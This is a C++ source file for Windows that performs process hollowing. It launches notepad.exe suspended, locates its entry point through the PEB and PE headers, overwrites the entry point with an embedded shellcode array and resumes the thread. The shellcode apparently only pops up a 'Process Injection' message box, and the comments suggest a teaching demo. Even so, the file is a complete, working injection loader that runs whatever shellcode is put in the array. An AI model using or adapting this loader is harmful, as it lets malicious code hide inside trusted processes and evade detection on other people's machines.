#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <cstring>

const char* k = "[+]";
const char* e = "[-]";

DWORD PID = NULL;
HANDLE hProcess = NULL;

unsigned char shellcode[] = {
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
    "\x8d\x8d\x34\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
    "\x00\x3e\x4c\x8d\x85\x22\x01\x00\x00\x48\x31\xc9\x41\xba"
    "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
    "\x56\xff\xd5\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x20\x73"
    "\x75\x63\x63\x65\x73\x66\x75\x6c\x00\x50\x72\x6f\x63\x65"
    "\x73\x73\x20\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x00\x75"
    "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00"
};

// Define types not in standard headers
typedef NTSTATUS(WINAPI* _ZwQueryInformationProcess)(
    HANDLE,
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
    );

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Start the Notepad process
    int status = CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"),
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi);

    if (!status) {
        printf("%s failed open process, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    hProcess = pi.hProcess;
    PID = pi.dwProcessId;
    printf("%s PID %ld\n", k, PID);
    system("pause");

    // Get ZwQueryInformationProcess from ntdll.dll
    _ZwQueryInformationProcess ZwQueryInformationProcess =
        (_ZwQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwQueryInformationProcess");

    if (!ZwQueryInformationProcess) {
        printf("%s Failed to get ZwQueryInformationProcess", e);
        return EXIT_FAILURE;
    }

    // Get PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

    // We read the Image Base Address from the PEB
    // In 64 bit architecture the offset for the Image Base Address is 16 bytes. 0x10
    PVOID pebAddress = pbi.PebBaseAddress;
    PVOID imageBaseAddress = nullptr;
    SIZE_T bytesRead;
    ReadProcessMemory(hProcess, (PBYTE)pebAddress + 0x10, &imageBaseAddress, sizeof(PVOID), &bytesRead);
    printf("%s Image Base Address: \\---0x%p\n", k, imageBaseAddress);

    // Read NE header to find Entry Point RVA
    // We create a 512 Bytes buffer to store the Headers of the executable
    BYTE buffer[0x200];
    ReadProcessMemory(hProcess, imageBaseAddress, buffer, sizeof(buffer), &bytesRead);

    // e_lfanew contains the address where the NE header beggins
    // It is at offset 0x3C (60 bytes) from the DOS Header
    // The Relative Virtual Address of the Entry Point is at offset 0x28 (40 bytes)
    DWORD e_lfanew = *(DWORD*)(buffer + 0x3C);
    DWORD entryPointRVA = *(DWORD*)(buffer + e_lfanew + 0x28);
    printf("%s Entry Point RVA: \\---0x%p\n", k, entryPointRVA);

    // We add the Image Base Address with the RVA of the Entry Point to get the real address
    PVOID entryPointAddress = (PBYTE)imageBaseAddress + entryPointRVA;

    printf("%s Entry Point Address: \\---0x%p\n", k, entryPointAddress);
    system("pause");

    // Optional
    // Create an array filled with zeros of the same size of the shellcode
    size_t size = sizeof(shellcode) / sizeof(shellcode[0]);
    unsigned char zeroArray[sizeof(shellcode)];
    std::memset(zeroArray, 0, size);

    // We use the Zero Array to demonstrate the Hollowing of the process
    SIZE_T bytesWritten;
    WriteProcessMemory(hProcess, entryPointAddress, zeroArray, sizeof(zeroArray), &bytesWritten);
    printf("%s The process Has been hollowed, filled with zeros\n", k);
    system("pause");

    // Now we write the shellcode at the Entry Point address of the process
    WriteProcessMemory(hProcess, entryPointAddress, shellcode, sizeof(shellcode), &bytesWritten);

    printf("%s Shellcode written on the Entry Point Address\n", k);
    system("pause");

    // Resume the suspended thread, executing the hollowed process
    ResumeThread(pi.hThread);

    printf("%s Process injection concluded! Press enter to exit\n", k);
    getchar();

    return EXIT_SUCCESS;
}
